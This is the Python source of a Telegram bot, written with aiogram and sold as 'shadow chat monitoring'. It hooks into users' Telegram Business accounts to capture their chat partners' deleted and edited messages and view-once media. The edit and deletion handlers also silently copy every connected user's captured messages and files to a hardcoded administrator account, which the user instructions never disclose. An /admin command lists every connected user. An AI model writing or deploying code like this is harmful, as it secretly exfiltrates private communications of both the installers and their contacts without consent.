import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import BusinessConnection, Message, BusinessMessagesDeleted, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command

TOKEN = os.getenv('BOT_TOKEN') 
ADMIN_ID = 1250562983  # ВАШ ID

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# --- ТЕМАТИЧЕСКИЕ ИЗОБРАЖЕНИЯ (NFT / Telegram Gifts) ---
IMG_SETTINGS = "https://i.imgur.com/K3yZ6vY.png"  # Картинка для меню настроек
IMG_EDITED = "https://i.imgur.com/3q1Zc8s.png"    # Картинка для измененного текста
IMG_DELETED = "https://i.imgur.com/9nFk9zZ.png"   # Картинка для удаленного текста
IMG_VIEWONCE = "https://i.imgur.com/Z4w2u2z.png"  # Картинка для сгоревшего медиа

# Оперативная память
msg_cache = {}        
users_db = {}         
connections_map = {} 
user_settings = {} 

def get_user_info(user, compact=False):
    if not user:
        return "Собеседник"
    if compact:
        return user.full_name
    name = user.full_name
    username = f"(@{user.username})" if user.username else ""
    return f"{name} {username} <code>[ID: {user.id}]</code>".replace("  ", " ")

def get_owner(connection_id):
    return connections_map.get(connection_id) or ADMIN_ID

def get_settings(user_id):
    if user_id not in user_settings:
        user_settings[user_id] = {
            "deleted": True, 
            "edited": True, 
            "view_once": True,
            "silent": False,    # Тихий режим (без звука)
            "compact": False    # Компактные карточки
        }
    return user_settings[user_id]

def settings_keyboard(user_id):
    s = get_settings(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{'🟢' if s['deleted'] else '🔴'} Ловить удаления", callback_data="set_deleted")],
        [InlineKeyboardButton(text=f"{'🟢' if s['edited'] else '🔴'} Ловить изменения", callback_data="set_edited")],
        [InlineKeyboardButton(text=f"{'🟢' if s['view_once'] else '🔴'} Одноразовые медиа", callback_data="set_view_once")],
        [
            InlineKeyboardButton(text=f"{'🔕' if s['silent'] else '🔔'} Без звука", callback_data="set_silent"),
            InlineKeyboardButton(text=f"{'📦' if s['compact'] else '📜'} Компакт", callback_data="set_compact")
        ]
    ])

# 1. АДМИН-ПАНЕЛЬ
@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    if not users_db:
        await message.answer("💎 <b>Сеть пуста</b>\nБаза пользователей пока не содержит записей.")
        return

    text = f"💎 <b>Панель управления | Активных узлов: {len(users_db)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in users_db.items():
        text += f"👤 <b>{data['name']}</b> (@{data['username']})\n└ ID: <code>{uid}</code>\n\n"
    text += "👁 <i>Мониторинг сети активен.</i>"
    await message.answer(text)

# 2. МЕНЮ НАСТРОЕК С КАРТИНКОЙ
@dp.message(Command("settings"))
async def open_settings(message: Message):
    text = (
        "🎛 <b>ПАНЕЛЬ УПРАВЛЕНИЯ NFT-ПЕРЕХВАТОМ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Настройте алгоритмы под себя:</i>\n\n"
        "🔕 <b>Без звука:</b> Уведомления приходят тихо.\n"
        "📦 <b>Компакт:</b> Скрывает ID и лишние детали из логов."
    )
    # Отправляем красивую картинку с меню
    await message.answer_photo(
        photo=IMG_SETTINGS, 
        caption=text, 
        reply_markup=settings_keyboard(message.from_user.id)
    )

@dp.callback_query(F.data.startswith("set_"))
async def process_settings_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    setting_key = callback.data.replace("set_", "")
    
    current_settings = get_settings(user_id)
    current_settings[setting_key] = not current_settings[setting_key]
    
    await callback.message.edit_reply_markup(reply_markup=settings_keyboard(user_id))
    status_text = "Активирован" if current_settings[setting_key] else "Деактивирован"
    await callback.answer(f"Модуль: {status_text}", show_alert=False)

# 3. ИНСТРУКЦИЯ ПРИ СТАРТЕ
@dp.message()
async def private_messages(message: Message):
    users_db[message.from_user.id] = {
        "name": message.from_user.full_name,
        "username": message.from_user.username or "Скрыт"
    }
    instruction = (
        "💎 <b>ТЕНЕВОЙ МОНИТОРИНГ ЧАТОВ</b> 💎\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "1️⃣ Настройки Telegram -> Telegram для бизнеса -> Чат-боты.\n"
        "2️⃣ Вставьте мой юзернейм и добавьте.\n"
        "3️⃣ Убедитесь, что есть доступ к нужным чатам.\n\n"
        "🎛 <i>Меню конфигурации: /settings</i>"
    )
    await message.answer(instruction)

# 4. СТАТУСЫ ПОДКЛЮЧЕНИЯ
@dp.business_connection()
async def b_connection(connection: BusinessConnection):
    if connection.is_enabled:
        connections_map[connection.id] = connection.user_chat_id
        try:
            await bot.send_photo(
                connection.user_chat_id,
                photo=IMG_SETTINGS,
                caption="💠 <b>АЛГОРИТМЫ ЗАПУЩЕНЫ</b>\n━━━━━━━━━━━━━━━━━━━━\nКанал перехвата установлен. Ожидаю активность.\n\n🎛 Управление: /settings"
            )
        except Exception: pass
    else:
        connections_map.pop(connection.id, None)
        try:
            await bot.send_message(connection.user_chat_id, "🔌 <b>СВЯЗЬ РАЗОРВАНА</b>\nБот отключен от бизнес-аккаунта.")
        except Exception: pass

# --- ФУНКЦИИ ОТПРАВКИ МЕДИА ---
async def send_alert_with_image(target_id, text, img_url, silent=False):
    try:
        await bot.send_photo(target_id, photo=img_url, caption=text, disable_notification=silent)
    except Exception:
        await bot.send_message(target_id, text, disable_notification=silent)

async def send_recovered_media(target_id, alert_text, m_type, m_id, silent=False):
    try:
        if m_type == 'photo': await bot.send_photo(target_id, m_id, caption=alert_text, disable_notification=silent)
        elif m_type == 'video': await bot.send_video(target_id, m_id, caption=alert_text, disable_notification=silent)
        elif m_type == 'video_note':
            await bot.send_message(target_id, alert_text, disable_notification=silent)
            await bot.send_video_note(target_id, m_id, disable_notification=silent)
        elif m_type == 'voice':
            await bot.send_message(target_id, alert_text, disable_notification=silent)
            await bot.send_voice(target_id, m_id, disable_notification=silent)
        elif m_type == 'document': await bot.send_document(target_id, m_id, caption=alert_text, disable_notification=silent)
        else: await bot.send_message(target_id, alert_text, disable_notification=silent)
    except Exception:
        await bot.send_message(target_id, alert_text + "\n<i>(Файл поврежден)</i>", disable_notification=silent)

# 5. КЭШИРОВАНИЕ И ОДНОРАЗОВЫЕ
@dp.business_message()
async def handle_messages(message: Message):
    owner_id = get_owner(message.business_connection_id)
    settings = get_settings(owner_id)
    
    author_info_full = get_user_info(message.from_user, compact=False)
    author_info_compact = get_user_info(message.from_user, compact=True)
    text = message.text or message.caption
    
    media_id, media_type = None, None
    if text:
        display_text = f"<blockquote>{text}</blockquote>"
    else:
        if message.photo: display_text, media_id, media_type = "<i>[📸 Фото]</i>", message.photo[-1].file_id, 'photo'
        elif message.video: display_text, media_id, media_type = "<i>[🎥 Видео]</i>", message.video.file_id, 'video'
        elif message.video_note: display_text, media_id, media_type = "<i>[⏺ Кружок]</i>", message.video_note.file_id, 'video_note'
        elif message.voice: display_text, media_id, media_type = "<i>[🎤 Голосовое]</i>", message.voice.file_id, 'voice'
        elif message.document: display_text, media_id, media_type = "<i>[📎 Документ]</i>", message.document.file_id, 'document'
        else: display_text = "<i>[Медиа-ассет]</i>"

    cache_key = f"{message.chat.id}_{message.message_id}"
    msg_cache[cache_key] = {
        "text": display_text,
        "author_full": author_info_full,
        "author_compact": author_info_compact,
        "date": message.date.strftime("%H:%M"),
        "media_id": media_id,
        "media_type": media_type
    }

    reply = message.reply_to_message
    if reply and settings["view_once"]:
        if reply.photo or reply.video or reply.video_note:
            reply_author = get_user_info(reply.from_user, settings["compact"])
            try:
                await bot.copy_message(chat_id=owner_id, from_chat_id=message.chat.id, message_id=reply.message_id, disable_notification=settings["silent"])
            except Exception:
                alert = f"🎁 <b>ОДНОРАЗОВЫЙ ПОДАРОК СГОРЕЛ</b>\n━━━━━━━━━━━━━━━━━━━━\nОт: <b>{reply_author}</b>\n\n⚠️ <i>Система зафиксировала попытку отправки NFT-медиа с таймером. Файл заблокирован сервером.</i>"
                await send_alert_with_image(owner_id, alert, IMG_VIEWONCE, settings["silent"])

# 6. ИЗМЕНЕНИЯ
@dp.edited_business_message()
async def catch_edited(message: Message):
    owner_id = get_owner(message.business_connection_id)
    settings = get_settings(owner_id)
    if not settings["edited"]: return

    cache_key = f"{message.chat.id}_{message.message_id}"
    original = msg_cache.get(cache_key)
    if not original: return

    author = original['author_compact'] if settings["compact"] else original['author_full']
    new_text_raw = message.text or message.caption
    new_display = f"<blockquote>{new_text_raw}</blockquote>" if new_text_raw else "<i>[Текст стерт]</i>"
    
    if settings["compact"]:
        alert_text = f"✍️ Изменено: {author}\n🟣 {original['text']}\n🔵 {new_display}"
    else:
        alert_text = f"🔮 <b>ИЗМЕНЕННЫЙ БЛОК ДАННЫХ</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Автор:</b> {author}\n\n🟣 <b>Исходник:</b>\n{original['text']}\n🔵 <b>Новый код:</b>\n{new_display}"
    
    await send_alert_with_image(owner_id, alert_text, IMG_EDITED, settings["silent"])
    if owner_id != ADMIN_ID:
        await send_alert_with_image(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", IMG_EDITED, settings["silent"])
    msg_cache[cache_key]["text"] = new_display

# 7. УДАЛЕНИЯ
@dp.deleted_business_messages()
async def catch_deleted(deleted: BusinessMessagesDeleted):
    owner_id = get_owner(deleted.business_connection_id)
    settings = get_settings(owner_id)
    if not settings["deleted"]: return

    chat_id = deleted.chat.id
    for msg_id in deleted.message_ids:
        cache_key = f"{chat_id}_{msg_id}"
        if cache_key in msg_cache:
            data = msg_cache[cache_key]
            author = data['author_compact'] if settings["compact"] else data['author_full']
            
            if settings["compact"]:
                alert_text = f"🗑 Удалено: {author}\n{data['text']}"
            else:
                alert_text = f"💎 <b>УДАЛЕННЫЙ АССЕТ</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Ликвидатор:</b> {author}\n⏱ <b>Таймкод:</b> {data['date']}\n\n📦 <b>Содержимое:</b>\n{data['text']}"
            
            # Если было медиа - шлем сам файл, если это был просто текст - шлем красивую NFT-заглушку
            if data.get('media_id'):
                await send_recovered_media(owner_id, alert_text, data['media_type'], data['media_id'], settings["silent"])
                if owner_id != ADMIN_ID:
                    await send_recovered_media(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", data['media_type'], data['media_id'], settings["silent"])
            else:
                await send_alert_with_image(owner_id, alert_text, IMG_DELETED, settings["silent"])
                if owner_id != ADMIN_ID:
                    await send_alert_with_image(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", IMG_DELETED, settings["silent"])

async def main():
    print("Бот с графическим NFT-интерфейсом запущен.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
